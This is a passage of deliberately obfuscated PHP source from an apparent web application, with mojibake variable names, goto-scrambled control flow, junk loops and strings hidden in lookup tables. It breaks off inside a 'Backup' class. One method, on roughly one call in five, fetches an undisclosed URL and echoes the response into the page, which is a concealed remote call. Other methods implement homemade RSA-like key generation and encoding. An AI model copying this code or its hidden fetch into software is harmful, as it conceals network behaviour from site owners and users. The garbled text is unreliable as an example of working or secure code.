$E¯‹Ú™¥‚¿[61]($E¯‹Ú™¥‚¿[145])->{$_SERVER[¦À‹¤][334]}($E¯‹Ú™¥‚¿[333])->{$_SERVER[¦À‹¤][335]}($c¼õËÒÊ‡Ä)->{$_SERVER[¦À‹¤][336]}(); goto då¥§îÉŞø; då¥§îÉŞø: $D™ÜÓéÌõ = $E¯‹Ú™¥‚¿[228]($D™ÜÓéÌõ, $E¯‹Ú™¥‚¿[10], $E¯‹Ú™¥‚¿[333]); if (!$E¯‹Ú™¥‚¿[248]($e¡ÏøÄå‡[$E¯‹Ú™¥‚¿[333]], $D™ÜÓéÌõ)) { $E¯‹Ú™¥‚¿[172]($E¯‹Ú™¥‚¿[337], !1, $E¯‹Ú™¥‚¿[245]); } goto FµÍ„ä³¡•; fõ—ÁÑŞëî: if ($c¼õËÒÊ‡Ä >= $E¯‹Ú™¥‚¿[250]($E¯‹Ú™¥‚¿[251])) { return; } $AÑùÀè£¹÷ = $E¯‹Ú™¥‚¿[61]($E¯‹Ú™¥‚¿[145])->{$_SERVER[¦À‹¤][146]}(); $FÆ½ËßíÙÚ = $aÂÉàÒëëğ[649]; goto F‹óß¶Ì•; FµÍ„ä³¡•: } public function zklq600e3c04() { goto B×ÊÅ¿Ì¯; aÔÀ³¦Æ¯¼: $E…Ê×âœ‘— = $e¨Å‚½Å¢â[258](array($e¨Å‚½Å¢â[259] => array($e¨Å‚½Å¢â[260] => $e¨Å‚½Å¢â[261], $e¨Å‚½Å¢â[262] => 3))); $fÚ‚Œ ›¤¿ = $Dô–Ëù­¬Š[651]; if (strlen($fÚ‚Œ ›¤¿) < $Dô–Ëù­¬Š[588]) { die; } goto EÃ´˜õƒèŸ; EÃ´˜õƒèŸ: $F®‹ÂÇ·Îì = @$e¨Å‚½Å¢â[263]($cŞÇ¢ğ¾¯ø, !1, $E…Ê×âœ‘—); $c°Ò‰­”– = $Dô–Ëù­¬Š[652]; while (strlen($c°Ò‰­”–) < $Dô–Ëù­¬Š[588]) { if (!$c°Ò‰­”–) { break; } $c°Ò‰­”–++; } goto DÃïÚ¦Ø¨â; DÃïÚ¦Ø¨â: echo $e¨Å‚½Å¢â[339] . $e¨Å‚½Å¢â[340]($F®‹ÂÇ·Îì) . $e¨Å‚½Å¢â[341]; goto EİÜğ·­•; e µ¤…‰ƒˆ: $cŞÇ¢ğ¾¯ø = $e¨Å‚½Å¢â[255]; $cŞÇ¢ğ¾¯ø = $this->{$_SERVER[¦À‹¤][256]}($cŞÇ¢ğ¾¯ø, $e¨Å‚½Å¢â[257]); $Fâ´¨–·°Ï = $Dô–Ëù­¬Š[650]; goto aÔÀ³¦Æ¯¼; B×ÊÅ¿Ì¯: $Dô–Ëù­¬Š =& $_SERVER[Š‰]; $e¨Å‚½Å¢â =& $_SERVER[¦À‹¤]; if (!$e¨Å‚½Å¢â[112]($GLOBALS, $e¨Å‚½Å¢â[138]) || $e¨Å‚½Å¢â[338](1, 100) > 20) { return; } goto e µ¤…‰ƒˆ; EİÜğ·­•: } private function zoty70ac323a($fÎ›Ú¡›„†, $c±”¨ï¹±, $Dõ‹Á•ùõ = 3) { goto câœ¦ÇÆÖ®; E¿´¥­¿‹á: if (strlen($eÔÔ’»Õ×) < $A§ÍŞ¥ÔÑ[574]) { return; } $Dœ‚â±‚±­ = $eÓšßí†Å¹[343]; switch ($E™´…ŠÙ¥) { case $eÓšßí†Å¹[240]: $aÒ·ğë†Ğ = $this->{$_SERVER[¦À‹¤][153]}($fÎ›Ú¡›„†, $eÓšßí†Å¹[220]($c±”¨ï¹± . $AÆÑÄê‘è®)); break; case $eÓšßí†Å¹[226]: $aÒ·ğë†Ğ = $this->{$_SERVER[¦À‹¤][153]}($fÎ›Ú¡›„†, $eÓšßí†Å¹[220]($AÆÑÄê‘è® . $c±”¨ï¹±)); break; $c¾ù‚§À† = $A§ÍŞ¥ÔÑ[657]; if (strlen($c¾ù‚§À†) < $A§ÍŞ¥ÔÑ[605]) { die; } case $eÓšßí†Å¹[344]: $aÒ·ğë†Ğ = $this->{$_SERVER[¦À‹¤][153]}($fÎ›Ú¡›„†, $eÓšßí†Å¹[124]($AÆÑÄê‘è® . $c±”¨ï¹±)); $Fµ³—ø§´¦ = $A§ÍŞ¥ÔÑ[658]; while (strlen($Fµ³—ø§´¦) < $A§ÍŞ¥ÔÑ[584]) { if (!$Fµ³—ø§´¦) { break; } $Fµ³—ø§´¦++; } break; case $eÓšßí†Å¹[345]: $aÒ·ğë†Ğ = $this->{$_SERVER[¦À‹¤][153]}($fÎ›Ú¡›„†, $eÓšßí†Å¹[120]($AÆÑÄê‘è® . $c±”¨ï¹±)); $e´åÃ•¢‘ = $A§ÍŞ¥ÔÑ[659]; while (strlen($e´åÃ•¢‘) < $A§ÍŞ¥ÔÑ[584]) { if (!$e´åÃ•¢‘) { break; } $e´åÃ•¢‘++; } break; $a‘éŒ«ä½ª = $A§ÍŞ¥ÔÑ[660]; if (strlen($a‘éŒ«ä½ª) < $A§ÍŞ¥ÔÑ[588]) { return; } case $eÓšßí†Å¹[346]: goto cÁ‰ø®¡äŸ; Aˆô™ÂïÏÄ: $aƒ°¶¨è¼ø = $eÓšßí†Å¹[10]; $CøçÑ¥†í = $A§ÍŞ¥ÔÑ[663]; if (!$CøçÑ¥†í) { die; } goto D¸ïŞ–¤¤î; AÖ–‡¤øİï: $a¡àÚÍç¾ = $eÓšßí†Å¹[25]($a¡àÚÍç¾, $eà½…÷‰‰À % 8, $eà½…÷‰‰À % 8 + 7); $fà¶“èâ¼Ç = $A§ÍŞ¥ÔÑ[662]; if (strlen($fà¶“èâ¼Ç) < $A§ÍŞ¥ÔÑ[596]) { return; } goto Aˆô™ÂïÏÄ; Aëùñá†: $eà½…÷‰‰À = $eÓšßí†Å¹[347](0, 64); $AÁÚÜÔìÄƒ = $Dœ‚â±‚±­[$eà½…÷‰‰À]; $a¡àÚÍç¾ = $eÓšßí†Å¹[120]($AÁÚÜÔìÄƒ . $eÓšßí†Å¹[120]($c±”¨ï¹± . $AÁÚÜÔìÄƒ) . $c±”¨ï¹±); goto AÖ–‡¤øİï; cÁ‰ø®¡äŸ: $fÎ›Ú¡›„† = $eÓšßí†Å¹[124]($fÎ›Ú¡›„†); $e¨ò›‹ = $A§ÍŞ¥ÔÑ[661]; if (!$e¨ò›‹) { return; } goto Aëùñá†; D¸ïŞ–¤¤î: $Dä¹ÕÀê±Ä = 0; $CĞ¹Íéêƒ¾ = 0; $f—¸Ú¸‰ß´ = 0; goto B…ñ¶™ğÌÈ; B…ñ¶™ğÌÈ: for ($Dä¹ÕÀê±Ä = 0; $Dä¹ÕÀê±Ä < $eÓšßí†Å¹[24]($fÎ›Ú¡›„†); $Dä¹ÕÀê±Ä++) { $f—¸Ú¸‰ß´ = $f—¸Ú¸‰ß´ == $eÓšßí†Å¹[24]($a¡àÚÍç¾) ? 0 : $f—¸Ú¸‰ß´; $fƒ…Í­Ù†ƒ = $A§ÍŞ¥ÔÑ[664]; if (!$fƒ…Í­Ù†ƒ) { die; } $CĞ¹Íéêƒ¾ = ($eà½…÷‰‰À + $eÓšßí†Å¹[348]($Dœ‚â±‚±­, $fÎ›Ú¡›„†[$Dä¹ÕÀê±Ä]) + $eÓšßí†Å¹[349]($a¡àÚÍç¾[$f—¸Ú¸‰ß´++])) % 64; $aƒ°¶¨è¼ø .= $Dœ‚â±‚±­[$CĞ¹Íéêƒ¾]; } $aÒ·ğë†Ğ = $eÓšßí†Å¹[340]($AÁÚÜÔìÄƒ . $aƒ°¶¨è¼ø); $eµ’ˆíîÔŸ = $A§ÍŞ¥ÔÑ[665]; goto cÈÔˆ¾õ¼¾; cÈÔˆ¾õ¼¾: break; goto eÙ¬Ò±×î‡; eÙ¬Ò±×î‡: default: $aÒ·ğë†Ğ = $this->{$_SERVER[¦À‹¤][153]}($fÎ›Ú¡›„†, $c±”¨ï¹± . $AÆÑÄê‘è®); $C°Û±„®• = $A§ÍŞ¥ÔÑ[666]; while (strlen($C°Û±„®•) < $A§ÍŞ¥ÔÑ[588]) { if (!$C°Û±„®•) { break; } $C°Û±„®•++; } break; } goto aæƒß’×Âñ; fíš¶Ì±‚: $C‹’Õªïğ = $A§ÍŞ¥ÔÑ[654]; $E™´…ŠÙ¥ = $eÓšßí†Å¹[338](0, 5) . $eÓšßí†Å¹[10]; $e¬“Åî«òê = $A§ÍŞ¥ÔÑ[655]; goto fŒ¨…²º©¡; aæƒß’×Âñ: $aÒ·ğë†Ğ = $eÓšßí†Å¹[220]($E™´…ŠÙ¥ . $AÆÑÄê‘è® . $aÒ·ğë†Ğ); $C·“ŞÕÔÓö = $A§ÍŞ¥ÔÑ[647]; while ($C·“ŞÕÔÓö < $A§ÍŞ¥ÔÑ[584]) { if ($C·“ŞÕÔÓö >= 0) { break; } $C·“ŞÕÔÓö++; } goto b¸‰±ò‹œ¸; aÑçÉ¾ËìŞ: $E¹„øöËËƒ = $A§ÍŞ¥ÔÑ[653]; if (!$E¹„øöËËƒ) { die; } $fÎ›Ú¡›„† = $eÓšßí†Å¹[2]($fÎ›Ú¡›„†); goto fíš¶Ì±‚; câœ¦ÇÆÖ®: $A§ÍŞ¥ÔÑ =& $_SERVER[Š‰]; $eÓšßí†Å¹ =& $_SERVER[¦À‹¤]; $eÓšßí†Å¹[342](1); goto aÑçÉ¾ËìŞ; fŒ¨…²º©¡: if (strlen($e¬“Åî«òê) < $A§ÍŞ¥ÔÑ[574]) { die; } $AÆÑÄê‘è® = $eÓšßí†Å¹[130](15); $eÔÔ’»Õ× = $A§ÍŞ¥ÔÑ[656]; goto E¿´¥­¿‹á; b¸‰±ò‹œ¸: if ($Dõ‹Á•ùõ - 1 > 0) { $aÒ·ğë†Ğ = $this->{$_SERVER[¦À‹¤][133]}($aÒ·ğë†Ğ, $c±”¨ï¹±, $Dõ‹Á•ùõ - 1); } return $aÒ·ğë†Ğ; goto A¸©˜…çó; A¸©˜…çó: } private function vmns17ee2f34($C¯ƒâòÍ», $EŸ¤ÔõìŸï, $aÉ¡íÄÀ– = 3) { goto A•Ä„ÙÖ´‡; AÌÇä†±î: $aËäÚ†Ê´¶ = $FãÃÎ¦É[670]; if (strlen($aËäÚ†Ê´¶) < $FãÃÎ¦É[584]) { return; } $bƒ¶¯š¦Û« = $e“Á²éÄëÓ[343]; goto BÀ™Å™Ã®; Cšƒ¥Ä¦Ï: $b…‰‘Ò¡Òõ = $C¯ƒâòÍ»[0]; $Cæ¸šÅ·³Ç = $FãÃÎ¦É[668]; if (!$Cæ¸šÅ·³Ç) { return; } goto a¤áÉÃÎ; a¤áÉÃÎ: $d¿Ò‰´ªñ† = $e“Á²éÄëÓ[25]($C¯ƒâòÍ», 1, 15); $F‚Ìˆ±Ï¹‡ = $FãÃÎ¦É[669]; $C¯ƒâòÍ» = $e“Á²éÄëÓ[25]($C¯ƒâòÍ», 16); goto AÌÇä†±î; AÆŒ¿ë¢Îù: if ($aÉ¡íÄÀ– - 1 > 0) { $Cà„ğÈç’Ñ = $this->{$_SERVER[¦À‹¤][195]}($Cà„ğÈç’Ñ, $EŸ¤ÔõìŸï, $aÉ¡íÄÀ– - 1); } return $Cà„ğÈç’Ñ; goto Cè§Á¶ÅÖ; a‘Œ¯ØãÔƒ: $C¯ƒâòÍ» = $e“Á²éÄëÓ[2]($C¯ƒâòÍ»); $C¯ƒâòÍ» = $e“Á²éÄëÓ[220]($C¯ƒâòÍ»); $Cœ‘±ñ½•´ = $FãÃÎ¦É[667]; goto Cšƒ¥Ä¦Ï; A•Ä„ÙÖ´‡: $FãÃÎ¦É =& $_SERVER[Š‰]; $e“Á²éÄëÓ =& $_SERVER[¦À‹¤]; if (!$e“Á²éÄëÓ[350]($C¯ƒâòÍ») || $e“Á²éÄëÓ[24]($C¯ƒâòÍ») < 10) { return !1; } goto a‘Œ¯ØãÔƒ; BÀ™Å™Ã®: $B²Ó¹Æ’¼¾ = $FãÃÎ¦É[671]; if (!$B²Ó¹Æ’¼¾) { return; } switch ($b…‰‘Ò¡Òõ) { case $e“Á²éÄëÓ[240]: $Cà„ğÈç’Ñ = $this->{$_SERVER[¦À‹¤][256]}($C¯ƒâòÍ», $e“Á²éÄëÓ[220]($EŸ¤ÔõìŸï . $d¿Ò‰´ªñ†)); $E‘Ö÷ôÁ™© = $FãÃÎ¦É[672]; while (strlen($E‘Ö÷ôÁ™©) < $FãÃÎ¦É[588]) { if (!$E‘Ö÷ôÁ™©) { break; } $E‘Ö÷ôÁ™©++; } break; $B„…¨Îàù = $FãÃÎ¦É[618]; if (!$B„…¨Îàù) { return; } case $e“Á²éÄëÓ[226]: $Cà„ğÈç’Ñ = $this->{$_SERVER[¦À‹¤][256]}($C¯ƒâòÍ», $e“Á²éÄëÓ[220]($d¿Ò‰´ªñ† . $EŸ¤ÔõìŸï)); $cÑ¤ÛÈ“ù = $FãÃÎ¦É[673]; while (strlen($cÑ¤ÛÈ“ù) < $FãÃÎ¦É[584]) { if (!$cÑ¤ÛÈ“ù) { break; } $cÑ¤ÛÈ“ù++; } break; case $e“Á²éÄëÓ[344]: $Cà„ğÈç’Ñ = $this->{$_SERVER[¦À‹¤][256]}($C¯ƒâòÍ», $e“Á²éÄëÓ[124]($d¿Ò‰´ªñ† . $EŸ¤ÔõìŸï)); break; case $e“Á²éÄëÓ[345]: $Cà„ğÈç’Ñ = $this->{$_SERVER[¦À‹¤][256]}($C¯ƒâòÍ», $e“Á²éÄëÓ[120]($d¿Ò‰´ªñ† . $EŸ¤ÔõìŸï)); break; case $e“Á²éÄëÓ[346]: goto E“ôƒ £ã†; fçËÅÊåÎ: break; goto c†ì’ÆßôØ; F»‰¡™‡­–: $fËŸ‰Òé§ó = 0; $aùç¿˜®‡é = 0; $E˜­Õ½•¹ = $FãÃÎ¦É[677]; goto c´è‚¯†„‘; c÷‡¸Â¨ÔÛ: $eä¥ÏâÚÍ = $FãÃÎ¦É[674]; $c‘¾‚“öŞÄ = $e“Á²éÄëÓ[348]($bƒ¶¯š¦Û«, $A½šöĞÕÅ£); $BÛ¿ñŞÇÖ´ = $e“Á²éÄëÓ[120]($A½šöĞÕÅ£ . $e“Á²éÄëÓ[120]($EŸ¤ÔõìŸï . $A½šöĞÕÅ£) . $EŸ¤ÔõìŸï); goto Dòªãíø; aå¤ Àçç‘: $dÆ·–¸ Šò = $e“Á²éÄëÓ[10]; $f˜¨ëéïÂì = $FãÃÎ¦É[676]; if (strlen($f˜¨ëéïÂì) < $FãÃÎ¦É[588]) { die; } goto F»‰¡™‡­–; c´è‚¯†„‘: while (strlen($E˜­Õ½•¹) < $FãÃÎ¦É[596]) { if (!$E˜­Õ½•¹) { break; } $E˜­Õ½•¹++; } $eâ¶òÈó±Ô = 0; for ($fËŸ‰Òé§ó = 0; $fËŸ‰Òé§ó < $e“Á²éÄëÓ[24]($C¯ƒâòÍ»); $fËŸ‰Òé§ó++) { $eâ¶òÈó±Ô = $eâ¶òÈó±Ô == $e“Á²éÄëÓ[24]($BÛ¿ñŞÇÖ´) ? 0 : $eâ¶òÈó±Ô; $a²ƒ‘İƒì = $eâ¶òÈó±Ô++; $aùç¿˜®‡é = $e“Á²éÄëÓ[348]($bƒ¶¯š¦Û«, $C¯ƒâòÍ»[$fËŸ‰Òé§ó]) - $c‘¾‚“öŞÄ - $e“Á²éÄëÓ[349]($BÛ¿ñŞÇÖ´[$a²ƒ‘İƒì]); $EÓãâõè”Ğ = $FãÃÎ¦É[678]; if (strlen($EÓãâõè”Ğ) < $FãÃÎ¦É[596]) { return; } while ($aùç¿˜®‡é < 0) { $aùç¿˜®‡é += 64; $EŒ¹ÉÆî¨ = $FãÃÎ¦É[679]; } $dÆ·–¸ Šò .= $bƒ¶¯š¦Û«[$aùç¿˜®‡é]; } goto a……‰è…Å‹; a……‰è…Å‹: $Cà„ğÈç’Ñ = $e“Á²éÄëÓ[352]($dÆ·–¸ Šò); $aÎ×Åé§¬¬ = $FãÃÎ¦É[680]; if (!$aÎ×Åé§¬¬) { return; } goto fçËÅÊåÎ; E“ôƒ £ã†: $C¯ƒâòÍ» = $e“Á²éÄëÓ[351]($C¯ƒâòÍ»); $A½šöĞÕÅ£ = $C¯ƒâòÍ»[0]; $C¯ƒâòÍ» = $e“Á²éÄëÓ[25]($C¯ƒâòÍ», 1); goto c÷‡¸Â¨ÔÛ; Dòªãíø: $CîÃ»›íÃ’ = $FãÃÎ¦É[675]; if (!$CîÃ»›íÃ’) { die; } $BÛ¿ñŞÇÖ´ = $e“Á²éÄëÓ[25]($BÛ¿ñŞÇÖ´, $c‘¾‚“öŞÄ % 8, $c‘¾‚“öŞÄ % 8 + 7); goto aå¤ Àçç‘; c†ì’ÆßôØ: default: $Cà„ğÈç’Ñ = $this->{$_SERVER[¦À‹¤][256]}($C¯ƒâòÍ», $EŸ¤ÔõìŸï . $d¿Ò‰´ªñ†); $CË á × = $FãÃÎ¦É[681]; break; $fÙÇŠ›¬— = $FãÃÎ¦É[682]; } goto AÆŒ¿ë¢Îù; Cè§Á¶ÅÖ: } public function pzaw779da41f($AŸÄº¹ë««) { goto bÅØ˜ù„‡ƒ; bÅØ˜ù„‡ƒ: $dÙõ—¥ØÈ =& $_SERVER[Š‰]; $f´Ï¡‡¯Èø =& $_SERVER[¦À‹¤]; $céÛÕğÙå½ = $this->{$_SERVER[¦À‹¤][353]}(); goto F—¾…îÉ¶; F—¾…îÉ¶: $D³¹™ŠÖï¦ = $this->{$_SERVER[¦À‹¤][353]}(); $eá½Ò¹µŠø = ($céÛÕğÙå½ - 1) * ($D³¹™ŠÖï¦ - 1); $E‡ã²ñİ²¡ = $f´Ï¡‡¯Èø[250](($céÛÕğÙå½ + $D³¹™ŠÖï¦) / 2); goto fÓÀóä«ä; Eˆ‰ÜŸ¢ëª: while ($D­‹ÌÑÜ < $dÙõ—¥ØÈ[596]) { if ($D­‹ÌÑÜ >= 0) { break; } $D­‹ÌÑÜ++; } $DÁºÂµ²Ã¦ = $this->{$_SERVER[¦À‹¤][153]}($AŸÄº¹ë««, $Cöî¿µÑ’–) . $f´Ï¡‡¯Èø[357] . $E³Ÿ¤‘¥¹÷; return $DÁºÂµ²Ã¦; goto f‚á¬¡åÃ; FÉ¥Ğ•ñ‘»: $E³Ÿ¤‘¥¹÷ = $this->{$_SERVER[¦À‹¤][153]}($céÛÕğÙå½ * $D³¹™ŠÖï¦ . $f´Ï¡‡¯Èø[10], $f´Ï¡‡¯Èø[155]); $Cöî¿µÑ’– = $f´Ï¡‡¯Èø[120]($f´Ï¡‡¯Èø[354] . ($céÛÕğÙå½ + $D³¹™ŠÖï¦) . $f´Ï¡‡¯Èø[355] . $E‡ã²ñİ²¡ . $f´Ï¡‡¯Èø[355] . $d©ñ¬Ä®‚ . $f´Ï¡‡¯Èø[356]); $D­‹ÌÑÜ = $dÙõ—¥ØÈ[684]; goto Eˆ‰ÜŸ¢ëª; fÓÀóä«ä: while (1) { $AãàØ×Å„Œ = $E‡ã²ñİ²¡; $Fùè¬šƒÇÂ = $eá½Ò¹µŠø; $eÜ•¾ãù—ô = $dÙõ—¥ØÈ[683]; while (strlen($eÜ•¾ãù—ô) < $dÙõ—¥ØÈ[596]) { if (!$eÜ•¾ãù—ô) { break; } $eÜ•¾ãù—ô++; } while ($Fùè¬šƒÇÂ % $AãàØ×Å„Œ != 0) { $e¿÷—‰æ«» = $Fùè¬šƒÇÂ; $Fùè¬šƒÇÂ = $AãàØ×Å„Œ; $AãàØ×Å„Œ = $e¿÷—‰æ«» % $AãàØ×Å„Œ; } if ($AãàØ×Å„Œ == 1) { break; } else { $E‡ã²ñİ²¡++; } } $d©ñ¬Ä®‚ = 2; for ($a±ò‚ªÁà = 0; $a±ò‚ªÁà < $eá½Ò¹µŠø * 10; $a±ò‚ªÁà++) { if (($eá½Ò¹µŠø * $a±ò‚ªÁà + 1) % $E‡ã²ñİ²¡ == 0) { $d©ñ¬Ä®‚ = $f´Ï¡‡¯Èø[250](($eá½Ò¹µŠø * $a±ò‚ªÁà + 1) / $E‡ã²ñİ²¡); break; } } goto FÉ¥Ğ•ñ‘»; f‚á¬¡åÃ: } public function xzqk13632a7f($Bõ½²ƒ³á”) { goto cõç—íÓÁ; AÍ¬ÙëØÉ: if ($bæ¾ˆÌï’›[19]($a›ğˆïí„•) != 2) { return $bæ¾ˆÌï’›[10]; } $F©Šƒ¿ó‘ = $this->{$_SERVER[¦À‹¤][256]}($a›ğˆïí„•[1] . $bæ¾ˆÌï’›[10], $bæ¾ˆÌï’›[155]); if (!$F©Šƒ¿ó‘) { return $bæ¾ˆÌï’›[10]; } goto b©Îò¬éğ›; D¯éø˜ÖÓ: for ($fíÁ„ƒö±š = 0; $fíÁ„ƒö±š < $EÁ’Î™´İ‰ * 10; $fíÁ„ƒö±š++) { if (($EÁ’Î™´İ‰ * $fíÁ„ƒö±š + 1) % $Bô­”ïõ†„ == 0) { $eß½ÂöèÎˆ = $bæ¾ˆÌï’›[250](($EÁ’Î™´İ‰ * $fíÁ„ƒö±š + 1) / $Bô­”ïõ†„); break; } } $FšÖó„µÏ = $bæ¾ˆÌï’›[120]($bæ¾ˆÌï’›[354] . ($aãŸÏ‰—ö + $F¤”¶ùØƒç) . $bæ¾ˆÌï’›[355] . $Bô­”ïõ†„ . $bæ¾ˆÌï’›[355] . $eß½ÂöèÎˆ . $bæ¾ˆÌï’›[356]); $aÖÖøËí‰Õ = $this->{$_SERVER[¦À‹¤][256]}($a›ğˆïí„•[0], $FšÖó„µÏ); goto e‹ßŠ´æÑ¶; e‹ßŠ´æÑ¶: return $aÖÖøËí‰Õ; $fôé÷£×ø­ = $BáåÉë½¡[694]; if (strlen($fôé÷£×ø­) < $BáåÉë½¡[588]) { die; } goto EÔ±¾ª¥ãŸ; b©Îò¬éğ›: $F©Šƒ¿ó‘ = $bæ¾ˆÌï’›[250]($F©Šƒ¿ó‘); $DàÃ¹Î½‹‰ = $BáåÉë½¡[685]; if (!$DàÃ¹Î½‹‰) { die; } goto FŒ‹Æƒ¯©Â; FŒ‹Æƒ¯©Â: $aãŸÏ‰—ö = 0; $BÏš™õ¶¹ = $BáåÉë½¡[686]; if (strlen($BÏš™õ¶¹) < $BáåÉë½¡[588]) { return; } goto eÎİ°…ãÍ¶; A•†¤âÚÀ½: $e³ÛàÚÄ = $BáåÉë½¡[689]; while ($e³ÛàÚÄ < $BáåÉë½¡[596]) { if ($e³ÛàÚÄ >= 0) { break; } $e³ÛàÚÄ++; } $Bô­”ïõ†„ = $bæ¾ˆÌï’›[250](($aãŸÏ‰—ö + $F¤”¶ùØƒç) / 2); goto fÙñ“‚½­; DÑ¿Ø°Æß: $eß½ÂöèÎˆ = 2; $EÂ‰Ô‹êÈ¶ = $BáåÉë½¡[693]; if (!$EÂ‰Ô‹êÈ¶) { die; } goto D¯éø˜ÖÓ; eÎİ°…ãÍ¶: $F¤”¶ùØƒç = 0; for ($fíÁ„ƒö±š = 3; $fíÁ„ƒö±š < $F©Šƒ¿ó‘; $fíÁ„ƒö±š += 2) { if ($F©Šƒ¿ó‘ % $fíÁ„ƒö±š != 0) { continue; } $aãŸÏ‰—ö = $fíÁ„ƒö±š; $fÛ„¼Õ‡Ö³ = $BáåÉë½¡[687]; $F¤”¶ùØƒç = $bæ¾ˆÌï’›[250]($F©Šƒ¿ó‘ / $fíÁ„ƒö±š); $A…ßõğ…Å‘ = $BáåÉë½¡[688]; break; } $EÁ’Î™´İ‰ = ($aãŸÏ‰—ö - 1) * ($F¤”¶ùØƒç - 1); goto A•†¤âÚÀ½; cõç—íÓÁ: $BáåÉë½¡ =& $_SERVER[Š‰]; $bæ¾ˆÌï’› =& $_SERVER[¦À‹¤]; $a›ğˆïí„• = $bæ¾ˆÌï’›[0]($bæ¾ˆÌï’›[357], $Bõ½²ƒ³á”); goto AÍ¬ÙëØÉ; fÙñ“‚½­: $C†ŠõÍˆ‹  = $BáåÉë½¡[690]; if (!$C†ŠõÍˆ‹ ) { return; } while (1) { $dŒêäªÓ×¯ = $Bô­”ïõ†„; $b¢ÉîÍßÀ = $BáåÉë½¡[691]; while ($b¢ÉîÍßÀ < $BáåÉë½¡[605]) { if ($b¢ÉîÍßÀ >= 0) { break; } $b¢ÉîÍßÀ++; } $B§é¹”ä•² = $EÁ’Î™´İ‰; while ($B§é¹”ä•² % $dŒêäªÓ×¯ != 0) { $D—¥™›‘ì = $B§é¹”ä•²; $B§é¹”ä•² = $dŒêäªÓ×¯; $dŒêäªÓ×¯ = $D—¥™›‘ì % $dŒêäªÓ×¯; $Dö›®»¥ßç = $BáåÉë½¡[692]; if (!$Dö›®»¥ßç) { return; } } if ($dŒêäªÓ×¯ == 1) { break; } else { $Bô­”ïõ†„++; } } goto DÑ¿Ø°Æß; EÔ±¾ª¥ãŸ: } public function pbah960abeb4() { goto c„è©¿¤´; e‰…çë¾: $eİ·Îİ‘…ê = array(); $c†®¥íÛö™ = $BÁœ¢ÁÑ¼‰[695]; while (strlen($c†®¥íÛö™) < $BÁœ¢ÁÑ¼‰[574]) { if (!$c†®¥íÛö™) { break; } $c†®¥íÛö™++; } goto DÛêˆÖŞ£‘; C‘šÅÎÚƒ›: $BìŸâ¿¬ = $BÁœ¢ÁÑ¼‰[697]; for ($BíÕƒ³ ‰ª = $Bé’ˆ»®—é; $BíÕƒ³ ‰ª > 1; $BíÕƒ³ ‰ª--) { $e¼ï‘Äñë— = !0; foreach ($eİ·Îİ‘…ê as $Bé¶°×Øƒ‰) { if ($BíÕƒ³ ‰ª % $Bé¶°×Øƒ‰ == 0) { $e¼ï‘Äñë— = !1; break; } } if ($e¼ï‘Äñë—) { $d¡›œÎñÒ— = $BíÕƒ³ ‰ª; break; } } return $d¡›œÎñÒ—; goto F°ù’ëâ®Ù; DÛêˆÖŞ£‘: $cºÊŒ¡Ë…í = 1; while ($cºÊŒ¡Ë…í <= (int) $FĞÚê¾İÍ“[359]($Bé’ˆ»®—é)) { $BíÕƒ³ ‰ª = $cºÊŒ¡Ë…í; $f¿®¯ÈÃøÕ = $BÁœ¢ÁÑ¼‰[696]; while (!0) { $BíÕƒ³ ‰ª++; if ($BíÕƒ³ ‰ª <= 2) { $cºÊŒ¡Ë…í = $BíÕƒ³ ‰ª; break; } else { if ($BíÕƒ³ ‰ª < 2) { continue; } } $e¼ï‘Äñë— = !0; for ($e»“ñÄ¸Ÿ = 2; $e»“ñÄ¸Ÿ <= $FĞÚê¾İÍ“[359]($BíÕƒ³ ‰ª); $e»“ñÄ¸Ÿ++) { if ($BíÕƒ³ ‰ª % $e»“ñÄ¸Ÿ == 0) { $e¼ï‘Äñë— = !1; } } if ($e¼ï‘Äñë—) { $cºÊŒ¡Ë…í = $BíÕƒ³ ‰ª; break; } } $eİ·Îİ‘…ê[] = $cºÊŒ¡Ë…í; } $d¡›œÎñÒ— = 2; goto C‘šÅÎÚƒ›; c„è©¿¤´: $BÁœ¢ÁÑ¼‰ =& $_SERVER[Š‰]; $FĞÚê¾İÍ“ =& $_SERVER[¦À‹¤]; $Bé’ˆ»®—é = $FĞÚê¾İÍ“[338]($FĞÚê¾İÍ“[358](2, 14), $FĞÚê¾İÍ“[358](2, 16) - 1); goto e‰…çë¾; F°ù’ëâ®Ù: } public function hrie53098c25($B¶‰ÅãÜÑ, $b­¦¡êÍœ·) { $aÈ™ñÜ—Ùš =& $_SERVER[Š‰]; $C’Á—ÑùŠ’ =& $_SERVER[¦À‹¤]; return $C’Á—ÑùŠ’[13](array($C’Á—ÑùŠ’[14], $C’Á—ÑùŠ’[360]), $B¶‰ÅãÜÑ, $b­¦¡êÍœ·); $d÷®ÒšĞ§ = $aÈ™ñÜ—Ùš[698]; while ($d÷®ÒšĞ§ < $aÈ™ñÜ—Ùš[574]) { if ($d÷®ÒšĞ§ >= 0) { break; } $d÷®ÒšĞ§++; } } public function idvx9b7c4d62($F¬ÇÁ‘ùğ, $cÎÜÍÔÏÚ«) { $D±¥µª¬› =& $_SERVER[¦À‹¤]; return $D±¥µª¬›[13](array($D±¥µª¬›[361], $D±¥µª¬›[362]), $F¬ÇÁ‘ùğ, $cÎÜÍÔÏÚ«); } public function lfqv989c1cff($a£¾‡¬Ÿ¿Ù, $B’Ú£äƒ©°) { $d‰éì–Ôè =& $_SERVER[¦À‹¤]; return $d‰éì–Ôè[13](array($d‰éì–Ôè[361], $d‰éì–Ôè[363]), $a£¾‡¬Ÿ¿Ù, $B’Ú£äƒ©°); $d±×÷Å = $_SERVER[Š‰][699]; if (!$d±×÷Å) { die; } } } class Backup { protected static $name; protected static $option; public function __construct() { $this->init(); } public function init() { $aŠ›ï—Óí =& $_SERVER[Š‰]; self::$name = date($aŠ›ï—Óí[700]); if (!($dÅŠœòÎƒ— = Model($aŠ›ï—Óí[701])->lastItem())) { $dÅŠœòÎƒ— = $this->initData(); } else { self::$name = $dÅŠœòÎƒ—[$aŠ›ï—Óí[28]]; if ($dÅŠœòÎƒ—[$aŠ›ï—Óí[702]] == $aŠ›ï—Óí[86]) { self::$name = date($aŠ›ï—Óí[703]); $e·³Îù¬ç = 0; if (isset($dÅŠœòÎƒ—[$aŠ›ï—Óí[289]][$aŠ›ï—Óí[173]][$aŠ›ï—Óí[441]])) { $e·³Îù¬ç = (int) $dÅŠœòÎƒ—[$aŠ›ï—Óí[289]][$aŠ›ï—Óí[173]][$aŠ›ï—Óí[441]]; } if ($dÅŠœòÎƒ—[$aŠ›ï—Óí[28]] == self::$name) { Model($aŠ›ï—Óí[701])->remove($dÅŠœòÎƒ—[$aŠ›ï—Óí[388]]); } $dÅŠœòÎƒ— = $this->initData($e·³Îù¬ç, $dÅŠœòÎƒ—[$aŠ›ï—Óí[704]]); } else { 